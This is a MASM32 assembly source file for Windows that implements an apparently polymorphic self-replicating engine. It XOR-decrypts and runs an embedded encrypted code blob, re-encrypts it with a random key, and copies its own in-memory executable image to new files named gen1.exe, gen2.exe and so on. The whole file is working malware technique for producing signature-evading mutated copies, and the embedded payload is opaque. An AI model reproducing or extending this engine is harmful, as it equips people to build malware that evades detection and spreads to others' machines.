; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

      .486                      ; create 32 bit code
      .model flat, stdcall      ; 32 bit memory model
      option casemap :none      ; case sensitive

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

;     include files
;     ~~~~~~~~~~~~~
      include \masm32\include\windows.inc
      include \masm32\include\masm32.inc
      include \masm32\include\user32.inc
      include \masm32\include\kernel32.inc
      include \masm32\include\msvcrt.inc
      include \masm32\macros\macros.asm
      include \masm32\include\dnsapi.inc

;     libraries
;     ~~~~~~~~~
      includelib \masm32\lib\masm32.lib
      includelib \masm32\lib\user32.lib
      includelib \masm32\lib\kernel32.lib
      includelib \masm32\lib\msvcrt.lib
      includelib \masm32\lib\dnsapi.lib
      
    .data
        fname       db  'gen',0
        fext        db  '.exe',0
        str_fmt     db  '%s%d%s',0
        strbuff     db  20 dup (?)
        init_key    db  0DFh
        first_run   db  0
        b_val       dd  0
        stack_ptr   dd  0
        ret_start   dd  0
        start_sec   dd  0
        num_sec     dd  0
        nxt_raw_dt  dd  0
        raw_dt_sz   dd  0
        f_align     dd  0
    .code

start:

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

    call main
    ;-------------------------
    ; Save the next generation
    ;-------------------------
    call save_mod
    invoke ExitProcess, eax

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

main proc

    LOCAL   lpflOldProtect:DWORD

    mov [stack_ptr], esp
    mov eax, [esp+8]
    mov [ret_start], eax
    mov eax, [esp+4]
    mov [b_val], eax
    

    xor eax, eax
    xor ecx, ecx
    xor edx, edx
re_run:
    mov eax, offset g1
    mov ecx, 112
    ;mov ecx, 107
    mov dl, [init_key]
    
xor_shell:
    xor [eax], dl
    inc eax
    loop xor_shell
    cmp [first_run], 1
    je  exit_main
    
    g1      db  0EEh, 004h, 0BBh, 054h, 0A4h, 0EFh, 054h, 0A0h, 0D3h, 054h, 0A0h, 0C3h, 054h, 098h, 0D7h, 054h  
    g2      db  0A8h, 0FFh, 054h, 0E0h, 05Fh, 0A1h, 0D3h, 0ECh, 0AAh, 02Dh, 056h, 018h, 0DCh, 0A7h, 0E3h, 054h  
    g3      db  088h, 0A7h, 0DEh, 01Dh, 054h, 0A5h, 0FFh, 0DEh, 018h, 056h, 002h, 054h, 0EBh, 070h, 0DEh, 019h  
    g4      db  09Ah, 05Eh, 0E1h, 09Ch, 0ADh, 0BAh, 0BEh, 0AAh, 02Dh, 05Eh, 0A1h, 0D7h, 0B0h, 0BCh, 0BAh, 0ACh  
    g5      db  0AAh, 036h, 054h, 0A5h, 0FBh, 0DEh, 018h, 0B9h, 054h, 0F3h, 0B0h, 054h, 0A5h, 0C3h, 0DEh, 018h  
    g6      db  054h, 0A3h, 070h, 023h, 0DEh, 018h, 056h, 006h, 06Eh, 0DEh, 08Ch, 03Dh, 022h, 0B7h, 0BCh, 0BEh  
    g7      db  0B3h, 0BCh, 056h, 03Dh, 08Dh, 08Dh, 08Ch, 08Ch, 08Ch, 08Ch, 08Ch, 08Ch, 08Dh, 08Ch, 020h, 008h 

    mov esp, [stack_ptr]
    mov eax, esp
    add eax, 4
    mov ebp, eax
    mov eax, [b_val]
    mov [esp+4], eax
    mov eax, [ret_start]
    mov [esp+8], eax

    inc [first_run]
    call rnd_gen
    jmp re_run

exit_main:
    dec [first_run]
    ret

main endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

rnd_gen  proc

gen_again:
    invoke Dns_GetRandomXid, 0
    and eax, 000000FFh
    cmp al, -1
    je gen_again
    cmp al, 0
    je gen_again
    mov [init_key], al

exit_rnd:
    ret
    
rnd_gen  endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

save_mod    proc

    LOCAL ImageBase:DWORD, hFile:DWORD, bread:DWORD
    LOCAL secRVA:DWORD, ctr:DWORD, tmpvar:DWORD

    mov [ImageBase], 0    
    call $+5
    pop ebx
    and ebx, 0FFFF0000h

s_img_base:
    cmp word ptr[ebx], 5a4dh
    je f_img_base
    sub ebx, 10000h
    jmp s_img_base

f_img_base:
    mov [ImageBase], ebx
    mov eax, [ImageBase]
    add eax, [eax+3Ch]          ;lf_anew -> PE signature
    xor ebx, ebx
    mov bx, [eax+4].IMAGE_FILE_HEADER.NumberOfSections
    mov [num_sec], ebx
    
    add eax, sizeof(IMAGE_NT_HEADERS)
    xor ecx, ecx
    mov ecx, eax
    mov [start_sec], ecx

    mov ctr, 1

try_create:
    invoke wsprintf, offset strbuff, offset str_fmt, offset fname, [ctr], offset fext
    invoke CreateFile, offset strbuff,
                       GENERIC_READ,
                       FILE_SHARE_READ,
                       0,
                       OPEN_EXISTING,
                       FILE_ATTRIBUTE_NORMAL,
                       0
    mov hFile, eax
    inc ctr
    cmp hFile, -1
    jne try_create

    mov hFile, fcreate(offset strbuff)
    
    mov ecx, [start_sec]
    sub ecx, [ImageBase]
    xor eax, eax
    mov eax, 28h            ;sizeof(IMAGE_SECTION_HEADER
    mov ebx, [num_sec]
    mul ebx
    mov esi, [ImageBase]
    
mov_hdr:
    pushad
    mov bread, fwrite(hFile,esi,1)
    popad
    lodsb
    loop mov_hdr

    mov eax, esi
    mov ecx, [start_sec]
    mov ecx, [ecx].IMAGE_SECTION_HEADER.PointerToRawData
    add ecx, [ImageBase]
    sub ecx, eax
w_pads:
    pushad
    mov bread, fwrite(hFile,esi,1)
    popad
    lodsb
    loop w_pads


    mov ctr, 0
next_sec:
    mov eax, [start_sec]
    mov ebx, ctr
    mov ecx, [eax+ebx].IMAGE_SECTION_HEADER.PointerToRawData
    push ebx
    mov ebx, [num_sec]
    mov tmpvar, ebx
    pop ebx
    sub tmpvar, 1
    cmp tmpvar, 0
    je no_more_sect
    push ebx
    mov ebx, [eax+ebx+28h].IMAGE_SECTION_HEADER.PointerToRawData
    mov tmpvar, ebx
    pop ebx
    sub tmpvar, ecx
    xchg ecx, tmpvar
    jmp write_sect

no_more_sect:
    mov ecx, [eax+ebx].IMAGE_SECTION_HEADER.SizeOfRawData

write_sect:
    mov edx, [eax+ebx].IMAGE_SECTION_HEADER.VirtualAddress
    mov [secRVA], edx
    add edx, [ImageBase]
    mov esi, edx
    
mov_sec_data:
    pushad
    mov bread, fwrite(hFile,esi,1)
    popad
    lodsb
    loop mov_sec_data
    add ctr, 28h
    dec [num_sec]
    cmp [num_sec], 0
    jne next_sec

    fclose hFile

exit_mod:
    ret
    
save_mod    endp

; ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

end start
